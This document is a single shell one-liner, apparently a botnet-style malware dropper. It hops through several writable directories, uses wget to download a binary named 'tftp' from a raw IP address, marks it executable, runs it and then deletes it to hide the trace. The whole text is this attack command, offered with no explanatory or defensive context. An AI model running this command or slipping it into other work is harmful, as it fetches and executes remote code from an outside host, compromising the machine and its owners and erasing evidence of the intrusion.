cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.164.32.104/tftp; chmod +x tftp; ./tftp; rm -rf tftp
